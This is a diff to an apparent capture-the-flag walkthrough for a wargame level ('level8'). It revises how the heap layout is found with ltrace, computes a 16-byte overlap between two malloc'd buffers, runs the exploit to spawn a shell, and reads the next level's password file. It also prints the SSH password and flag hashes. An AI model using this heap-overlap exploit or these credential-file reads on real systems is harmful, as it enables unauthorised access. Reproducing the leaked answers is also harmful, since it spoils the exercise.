@@ -14,30 +14,21 @@
    ssh level8@localhost -p 2222
    Password: 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 
-4. Verify heap layout by running the program:
-   ./level8
+4. Use ltrace to discover heap layout:
+   (echo "auth AAAA"; echo "service BBBBBBBBBBBBBBBB"; echo "login") | ltrace ./level8
    
-   Type: auth AAAA
-   Output: 0x804a008, (nil)  ← auth allocated at 0x804a008
+   Key observations:
+   malloc(4) = 0x0804a008             ← auth allocated
+   malloc(17) = 0x0804a018            ← service allocated (strdup calls malloc)
    
-   Type: service BBBBBBBBBBBBBBBB
-   Output: 0x804a008, 0x804a018  ← service allocated at 0x804a018
-   
-   Distance: 0x804a018 - 0x804a008 = 16 bytes (0x10)
-
-5. Calculate the exploit:
-   Goal: Make auth[32] read non-zero data
-   
-   auth points to: 0x804a008
-   auth[32] is at: 0x804a008 + 0x20 = 0x804a028
-   
-   service points to: 0x804a018
-   auth[32] offset into service: 0x804a028 - 0x804a018 = 16 bytes
+   Distance: 0x0804a018 - 0x0804a008 = 16 bytes
+   auth[32] is at: 0x0804a008 + 0x20 = 0x0804a028
+   Offset into service: 0x0804a028 - 0x0804a018 = 16 bytes
    
    Conclusion: If service is ≥16 bytes long, auth[32] will read 
    into service buffer and find non-zero data!
 
-6. Execute the exploit:
+5. Execute the exploit:
    ./level8
    
    Enter these commands:
@@ -47,10 +38,10 @@
    
    Shell spawned!
 
-7. Get the flag:
+6. Get the flag:
    cat /home/user/level9/.pass
    
    Password: c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
 
-8. Exit and login as level9:
+7. Exit and login as level9:
    su level9
